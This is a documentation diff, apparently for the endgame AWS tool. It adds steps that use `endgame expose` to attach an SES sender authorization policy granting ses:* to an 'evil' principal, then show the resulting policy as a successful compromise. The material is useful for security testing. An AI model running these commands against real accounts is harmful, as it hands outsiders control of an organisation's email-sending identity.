@@ -12,7 +12,50 @@ This can be abused by adding a rogue user as a [Delegate sender](https://docs.aw
 
 ## Steps to Reproduce
 
+* To expose the resource using `endgame`, run the following from the victim account:
+
+```bash
+export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil
+
+endgame expose --service ses --name test-resource-exposure.com
+```
+
+* To verify that the sender authorization policy has been set to allow actions from the rogue user, run the following command from the victim account:
+
+```bash
+aws ses list-identity-policies --identity test-resource-exposure.com
+```
+
+The command above will return the following:
+
+```bash
+{
+    "PolicyNames": [
+        "Endgame"
+    ]
+}
+```
+
+* Take the response from the command above - `Endgame` - and list the policy name in the command below
+
+```bash
+aws ses get-identity-policies --identity test-resource-exposure.com --policy-names "Endgame"
+```
+
+* Observe that the contents match the example shown below
+
 ## Example
+
+The policy below allows the Evil Principal (`arn:aws:iam::999988887777:user/evil` access to `ses:*` to the victim resource (`arn:aws:ses:us-east-1:111122223333:identity/test-resource-exposure.com`), indicating a successful compromise.
+
+```json
+{
+    "Policies": {
+        "Endgame": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"AllowCurrentAccount\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::111122223333:root\"},\"Action\":\"ses:*\",\"Resource\":\"arn:aws:ses:us-east-1:111122223333:identity/test-resource-exposure.com\"},{\"Sid\":\"Endgame\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::999988887777:user/evil\"},\"Action\":\"ses:*\",\"Resource\":\"arn:aws:ses:us-east-1:111122223333:identity/test-resource-exposure.com\"}]}"
+    }
+}
+
+```
 
 ## Exploitation
 
